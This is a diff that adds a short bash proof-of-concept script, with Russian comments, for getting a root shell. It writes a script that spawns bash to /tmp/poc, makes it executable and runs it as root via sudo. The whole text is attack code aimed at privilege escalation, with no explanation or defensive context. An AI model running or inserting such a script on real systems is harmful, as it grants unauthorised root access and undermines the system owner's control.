@@ -1,0 +1,10 @@
+#!/bin/bash
+
+# Создаем файл /tmp/poc с указанным содержимым
+echo -e "#!/bin/bash \n bash" > /tmp/poc
+
+# Делаем файл исполняемым
+chmod +x /tmp/poc
+
+# Запускаем файл от имени root
+sudo -u root /tmp/poc
